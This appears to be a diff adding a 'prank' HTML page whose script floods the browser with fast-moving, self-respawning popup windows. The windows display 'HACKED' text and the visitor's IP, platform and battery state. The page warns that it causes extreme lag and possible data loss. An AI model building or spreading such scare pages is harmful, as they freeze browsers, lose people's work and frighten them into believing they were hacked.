@@ -1,0 +1,89 @@
+<html>
+    <head>
+        <title>Hacklers COOKED</title>
+    </head>
+    <body>
+        <h1>THIS IS A PRANK!!! DO NOT TAKE THIS SERIOUSLY, NO DATA IS DOWNLOADED OR SOLD. THIS VERSION CAUSES EXTREME LAG. DO NOT RUN UNLESS YOU HAVE NOTHING ELSE OPEN! IT IS NOT MY FAULT IF YOU LOSE DATA!!!!!</h1>
+        <button onclick="Start()">Begin</button>
+        <script>
+        function addWindow(text) {
+            var hackedWindow = window.open("", "", "width=400,height=400")
+            hackedWindow.document.writeln(text)
+            setInterval(function() {
+                hackedWindow.document.title = (Math.random() * 5000).toString()
+            }, 1)
+            
+            var height = window.screen.availHeight
+            var width = window.screen.availWidth
+            
+            setInterval(function() {
+                hackedWindow.moveTo(Math.floor(Math.random() * (width - 400)), Math.floor(Math.random() * (height - 400)))
+            }, 15)
+            
+            hackedWindow.addEventListener("beforeunload", function() {
+                alert("Think you can close me?!")
+                addWindow("Think you can close me?!")
+                addWindow("Think you can close me?!")
+                addWindow("<img src='https://i.pinimg.com/736x/72/cf/8e/72cf8eeeaf310f363608fd30367ac635.jpg' width='100%' height='100%'>")
+            })
+            
+            return hackedWindow
+        }
+        var windows = []
+        
+        async function getIP() {
+            var res = await fetch("https://api.ipify.org?format=json")
+            var data = await res.json()
+            return data.ip
+        }
+        
+        var start = false
+        
+        function Start() {
+            if (!start) {
+                start = true
+                
+                windows.push(addWindow("HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED"))
+                navigator.getBattery().then((battery) => {
+                    windows.push(addWindow(`Your battery is ${battery.charging ? "Charging" : "Not Charging"}`))
+                })
+                windows.push(addWindow(`Platform: ${navigator.platform}`))
+                getIP().then((ip) => windows.push(addWindow(`IP: ${ip}`)))
+                
+                function closeWindows() {
+                    windows.forEach((element) => {
+                        element.close()
+                    })
+                    newWindows.forEach((element) => {
+                        element.close()
+                    })
+                }
+                setInterval(function() {
+                    windows.forEach((element) => {
+                        element.focus()
+                    })
+                }, 1000)
+                var newWindows = []
+                
+                setInterval(function() {
+                    getIP().then((ip) => {
+                        newWindows.push(window.open("", ""))
+                        newWindow.document.write(`
+                            <h1>GET HACKED</h1>
+                            <p>
+                            PLATFORM: ${navigator.platform}<br>
+                            IP: ${ip}
+                            </p>
+                        `)
+                    })
+                }, 25)
+                setInterval(function() {
+                    addWindow("COOKED!!!!111!")
+                    addWindow("COOKED!!!!111!")
+                    addWindow("<img src='https://i.pinimg.com/736x/72/cf/8e/72cf8eeeaf310f363608fd30367ac635.jpg' width='100%' height='100%'>")
+                }, 100)
+            }
+        }
+        </script>
+    </body>
+</html>
